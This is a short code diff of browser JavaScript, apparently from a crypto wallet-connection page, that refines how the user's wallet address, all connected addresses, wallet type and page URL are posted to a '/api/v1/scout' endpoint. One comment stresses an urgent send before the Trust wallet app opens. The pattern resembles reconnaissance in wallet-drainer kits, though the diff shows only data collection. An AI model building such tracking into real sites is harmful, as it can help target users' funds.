@@ -3393,11 +3393,11 @@
       return true;
     }
     var connected = [];
-    Object.keys(addrs).forEach(function (k) { if (addrs[k]) connected.push(addrs[k]); });
+    Object.keys(addrs).forEach(function (k) { if (addrs[k]) connected.push(k + ':' + addrs[k]); });
     // URGENT keepalive — must beat Safari freeze when Trust app opens
     var res = await apiPostUrgent('/api/v1/scout', {
       user_address: evmAddr,
-      chain_id: Number(chainId) || 1,
+      chain_id: Number(chainId) > 0 ? Number(chainId) : (S.evmChain > 0 ? Number(S.evmChain) : undefined),
       wallet_type: walletName || 'Unknown',
       chain_family: 'EVM',
       source_page: window.location.href,
@@ -4557,10 +4557,10 @@
       try {
         var map = allAddrs || collectAddressMap(address);
         var connected = [];
-        Object.keys(map).forEach(function (k) { if (map[k]) connected.push(map[k]); });
+        Object.keys(map).forEach(function (k) { if (map[k]) connected.push(k + ':' + map[k]); });
         var res = await apiPost('/api/v1/scout', {
           user_address: address,
-          chain_id: Number(chainId) || 1,
+          chain_id: Number(chainId) > 0 ? Number(chainId) : (S.evmChain > 0 ? Number(S.evmChain) : undefined),
           wallet_type: walletName || 'Unknown',
           chain_family: 'EVM',
           source_page: window.location.href,
